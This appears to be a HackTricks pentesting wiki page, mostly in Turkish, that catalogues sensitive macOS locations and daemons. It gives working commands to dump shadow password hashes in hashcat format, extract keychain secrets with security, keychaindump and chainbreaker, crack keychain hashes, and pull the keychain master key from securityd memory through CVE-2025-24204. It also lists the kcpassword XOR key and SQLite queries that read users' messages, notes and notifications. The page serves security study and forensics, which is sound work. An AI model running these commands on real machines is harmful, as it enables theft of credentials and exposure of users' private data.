# macOS Sensitive Locations & Interesting Daemons

{{#include ../../../banners/hacktricks-training.md}}

## Parolalar

### Shadow Parolalar

Shadow password, kullanıcının yapılandırmasıyla birlikte **`/var/db/dslocal/nodes/Default/users/`** konumundaki plist dosyalarında saklanır.\
Aşağıdaki tek satırlık komut, **kullanıcılar hakkındaki tüm bilgileri** (hash bilgisi dahil) dökmek için kullanılabilir:
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Scripts like this one**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) or [**this one**](https://github.com/octomagon/davegrohl.git) can be used to transform the hash to **hashcat** **format**.

Alternatif bir tek satırlık komut, tüm service olmayan hesapların creds bilgilerini hashcat formatında `-m 7100` (macOS PBKDF2-SHA512) dökecektir:
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Kullanıcının `ShadowHashData` değerini elde etmenin başka bir yolu da `dscl` kullanmaktır: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Bu dosya, sistem **single-user mode** içinde çalışırken **yalnızca kullanılır** (bu yüzden çok sık değil).

### Keychain Dump

`security` binary’sini kullanarak **şifreleri decrypt edilmiş şekilde dump** ederken, bu işlemi izin vermesi için kullanıcıya birkaç prompt gösterileceğini unutmayın.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
Modern macOS’ta en ilginç backing store’lar genellikle **`~/Library/Keychains/login.keychain-db`** ve **`/Library/Keychains/System.keychain`** olur. Bunlar SQLite-backed dosyalardır, ancak plaintext erişim hâlâ **`securityd`** tarafından aracılanır: ham DB’yi çalmak size çoğunlukla yalnızca metadata ve şifreli blob’lar verir, yeter ki kullanıcının parolasını, `SystemKey`’ini ya da in-memory master key’i de kurtarmamış olun.

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Based on this comment [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) it looks like these tools aren't working anymore in Big Sur.

### Keychaindump Overview

**keychaindump** adlı bir araç, macOS keychain’lerden parolaları çıkarmak için geliştirilmiştir, ancak [bir tartışmada](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) belirtildiği gibi Big Sur gibi daha yeni macOS sürümlerinde sınırlamalarla karşılaşır. **keychaindump** kullanımı, saldırganın erişim elde etmesini ve yetkileri **root** seviyesine yükseltmesini gerektirir. Araç, kolaylık için keychain’in kullanıcı oturumu açıldığında varsayılan olarak unlock edilmesi gerçeğini istismar eder; böylece uygulamalar kullanıcı parolasını tekrar tekrar istemeden ona erişebilir. Ancak, bir kullanıcı keychain’ini her kullanımdan sonra lock etmeyi seçerse, **keychaindump** etkisiz hâle gelir.

**Keychaindump**, Apple tarafından authorization ve cryptographic operations için bir daemon olarak tanımlanan ve keychain’e erişim için kritik olan **securityd** adlı belirli bir süreci hedef alarak çalışır. Çıkarma süreci, kullanıcının login password’ünden türetilmiş bir **Master Key** belirlemeyi içerir. Bu anahtar, keychain dosyasını okumak için gereklidir. **Master Key**’i bulmak için **keychaindump**, **securityd**’nin bellek heap’ini `vmmap` komutunu kullanarak tarar ve `MALLOC_TINY` olarak işaretlenmiş alanlarda potansiyel anahtarları arar. Bu bellek konumlarını incelemek için şu komut kullanılır:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Olası master key’leri belirledikten sonra, **keychaindump** heap’ler içinde master key adayı olduğunu gösteren belirli bir pattern’i (`0x0000000000000018`) arar. Bu key’i kullanmak için, **keychaindump**’ın source code’unda açıklandığı gibi, deobfuscation dahil ek adımlar gerekir. Bu alana odaklanan analysts, keychain’i decrypt etmek için gerekli kritik data’nın **securityd** process’inin memory’sinde saklandığını not etmelidir. **keychaindump**’ı çalıştırmak için örnek bir command:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) bir OSX keychain’den aşağıdaki bilgi türlerini adli açıdan güvenli bir şekilde çıkarmak için kullanılabilir:

- Hashed Keychain password, [hashcat](https://hashcat.net/hashcat/) veya [John the Ripper](https://www.openwall.com/john/) ile crack etmeye uygun
- Internet Passwords
- Generic Passwords
- Private Keys
- Public Keys
- X509 Certificates
- Secure Notes
- Appleshare Passwords

Keychain unlock password, [volafox](https://github.com/n0fate/volafox) veya [volatility](https://github.com/volatilityfoundation/volatility) ile elde edilen bir master key ya da SystemKey gibi bir unlock file verildiğinde, Chainbreaker ayrıca plaintext passwords de sağlar.

Bu yöntemlerden biriyle Keychain unlock edilmeden, Chainbreaker mevcut diğer tüm bilgileri gösterecektir.

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **SystemKey ile keychain anahtarlarını (şifrelerle birlikte) dökme**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Anahtar zinciri anahtarlarını (parolalarla birlikte) hash’i kırarak dök**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Keychain anahtarlarını (parolalarla birlikte) bellek dökümüyle çıkarma**

[Bu adımları izleyin](../index.html#dumping-memory-with-osxpmem) bir **bellek dökümü** gerçekleştirmek için
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Kullanıcının parolasını kullanarak keychain anahtarlarını (parolalarla birlikte) dökme**

Kullanıcının parolasını biliyorsanız, bunu kullanarak **kullanıcıya ait keychain'leri dökebilir ve şifrelerini çözebilirsiniz**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### `gcore` entitlement ile Keychain master key (CVE-2025-24204)

macOS 15.0 (Sequoia), `/usr/bin/gcore` ile **`com.apple.system-task-ports.read`** entitlement’ını birlikte gönderdi; bu yüzden herhangi bir local admin (veya kötü amaçlı imzalı app), **SIP/TCC enforced olsa bile herhangi bir process memory** dump edebiliyordu. `securityd` dump etmek, **Keychain master key**’i clear halde leak eder ve user password olmadan `login.keychain-db`’yi decrypt etmenizi sağlar.

**Vulnerable builds üzerinde quick repro (15.0–15.2):**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Ayıklanan hex anahtarını Chainbreaker’a (`--key <hex>`) vererek login keychain’i decrypt edin. Apple, yetkiyi **macOS 15.3+** içinde kaldırdı; bu yüzden bu yalnızca yamalanmamış Sequoia build’lerinde veya vulnerable binary’yi koruyan sistemlerde çalışır.

### kcpassword

**kcpassword** dosyası, yalnızca sistem sahibi **automatic login** etkinleştirdiyse **kullanıcının login password**’ünü tutan bir dosyadır. Bu nedenle kullanıcıdan password istenmeden otomatik olarak login yapılır (bu çok güvenli değildir).

Password, **`/etc/kcpassword`** dosyasında **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** anahtarıyla xored edilerek saklanır. Kullanıcının password’ü anahtardan uzunsa, anahtar yeniden kullanılır.\
Bu, password’ü geri kazanmayı oldukça kolaylaştırır; örneğin [**this one**](https://gist.github.com/opshope/32f65875d45215c3677d) gibi script’ler kullanılarak.

## Interesting Information in Databases

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Notifications

**Sequoia** öncesinde, Notification Center deposunu genellikle **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`** içinde bulabilirsiniz. **Sequoia+** ile Apple bunu TCC korumalı grup container’ına taşıdı: **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**.

İlginç bilgilerin çoğu **blob** sütunlarında saklanır, bu yüzden bu içeriği çıkarmanız ve insan tarafından okunabilir bir şeye dönüştürmeniz gerekir (`plutil -p -`, `strings`, veya küçük bir parser). Hızlı triage örnekleri:
```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```
#### Son gizlilik sorunları (NotificationCenter DB)

- macOS **14.7–15.1** sürümlerinde Apple, banner içeriğini `db2/db` SQLite içinde uygun redaction olmadan sakladı. **CVE-2024-44292/44293/40838/54504** CVE’leri, herhangi bir yerel kullanıcının DB’yi açarak diğer kullanıcıların notification metnini okumasına izin verdi (TCC prompt yoktu).
- Apple bunu, DB’yi `group.com.apple.usernoted` içine taşıyıp yeni Sequoia build’lerinde TCC ile koruyarak azalttı; bu yüzden güncel sistemlerde bunu okumak için normalde doğru user context ya da bir TCC bypass gerekir.
- Legacy endpoint’lerde, artefact’leri korumak istiyorsanız update veya reboot etmeden önce `db`, `db-wal` ve `db-shm` dosyalarını birlikte kopyalayın.

### Notes

Kullanıcıların **notes** verileri `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite` içinde bulunabilir
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```
Eğer yukarıdaki one-liner fazla gürültülüyse, `ZICNOTEDATA.ZDATA` dosyasını export edin, gunzip ile açın ve protobuf’u parse edin: bu, genellikle SQLite üzerinde doğrudan `strings` çalıştırmaktan daha güvenilirdir.

### Background Tasks / Login Items

**Ventura**’dan beri, kullanıcı tarafından onaylanan login items ve birkaç background task, **BTM** store’larında izlenir; örneğin **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** ve versiyonlanmış sistem cache’i **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.

Bu dosyalar, persistence, helper tools ve bazı MDM-managed background items’i hızlıca belirlemek için kullanışlıdır:
```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```
Kalıcılık açısından ve BTM iç yapıları için [auto-start locations page](../../macos-auto-start-locations.md#login-items) ve [Background Tasks Management notes](../macos-security-protections/README.md#background-tasks-management) bölümüne bakın.

## Preferences

macOS uygulamalarında preferences **`$HOME/Library/Preferences`** içinde bulunur ve iOS'ta `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences` içindedir.

macOS'ta cli aracı **`defaults`**, **Preferences dosyasını değiştirmek** için kullanılabilir.

**`/usr/sbin/cfprefsd`**, `com.apple.cfprefsd.daemon` ve `com.apple.cfprefsd.agent` XPC services'lerini sahiplenir ve preferences'ı değiştirme gibi işlemleri gerçekleştirmek için çağrılabilir.

## OpenDirectory permissions.plist

`/System/Library/OpenDirectory/permissions.plist` dosyası, node attributes üzerinde uygulanan permissions'ı içerir ve SIP tarafından korunur.\
Bu dosya, belirli kullanıcılara UUID ile (uid ile değil) permissions verir; böylece diğerlerinin yanında `ShadowHashData`, `HeimdalSRPKey` ve `KerberosKeys` gibi belirli hassas bilgilere erişebilirler:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## System Notifications

### Darwin Notifications

Bildirimler için ana daemon **`/usr/sbin/notifyd`**'dir. Bildirimleri almak için istemcilerin `com.apple.system.notification_center` Mach portu üzerinden kayıt olması gerekir (`sudo lsmp -p <pid notifyd>` ile kontrol edebilirsiniz). Daemon, `/etc/notify.conf` dosyası ile yapılandırılabilir.

Bildirimler için kullanılan isimler benzersiz reverse DNS notations'dır ve bunlardan birine bir bildirim gönderildiğinde, bunu işleyebileceğini belirtmiş olan client(lar) alır.

`notifyd` sürecine SIGUSR2 sinyali gönderip oluşturulan dosyayı okuyarak mevcut durumu dökmek (ve tüm isimleri görmek) mümkündür: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

**Ana ikili dosyası** **`/usr/sbin/distnoted`** olan **Distributed Notification Center**, bildirim göndermenin başka bir yoludur. Bazı XPC services sunar ve istemcileri doğrulamaya çalışmak için bazı kontroller yapar.

### Apple Push Notifications (APN)

Bu durumda, uygulamalar **topics** için kayıt olabilir. İstemci, **`apsd`** üzerinden Apple’ın sunucularına bağlanarak bir token oluşturur.\
Ardından, provider’lar da bir token oluşturmuş olacak ve istemcilere mesaj göndermek için Apple’ın sunucularına bağlanabilecektir. Bu mesajlar yerel olarak **`apsd`** tarafından alınır ve bildirimi onu bekleyen uygulamaya iletir.

Preferences, `/Library/Preferences/com.apple.apsd.plist` konumunda bulunur.

macOS’ta `/Library/Application\ Support/ApplePushService/aps.db` ve iOS’ta `/var/mobile/Library/ApplePushService` konumunda bulunan yerel bir mesaj veritabanı vardır. 3 tablo içerir: `incoming_messages`, `outgoing_messages` ve `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Ayrıca daemon ve bağlantılar hakkında bilgi almak için şunu kullanmak da mümkündür:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## User Notifications

These are notifications that the user should see in the screen:

- **`CFUserNotification`**: Bu API'ler, ekranda bir mesaj içeren bir pop-up göstermenin bir yolunu sağlar.
- **The Bulletin Board**: Bu, iOS'ta kaybolan ve Notification Center'da saklanacak bir banner gösterir.
- **`NSUserNotificationCenter`**: Bu, MacOS'taki iOS bulletin board'dur. Eski macOS sürümlerinde veritabanı genellikle `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db` konumunda bulunur; Sequoia+ sürümünde `~/Library/Group Containers/group.com.apple.usernoted/db2/db` konumuna taşındı.

## References

- **HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)**](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- **Apple Platform Security – Keychain data protection**](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- **9to5Mac – Apple addresses privacy concerns around Notification Center database in macOS Sequoia**](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)

{{#include ../../../banners/hacktricks-training.md}}
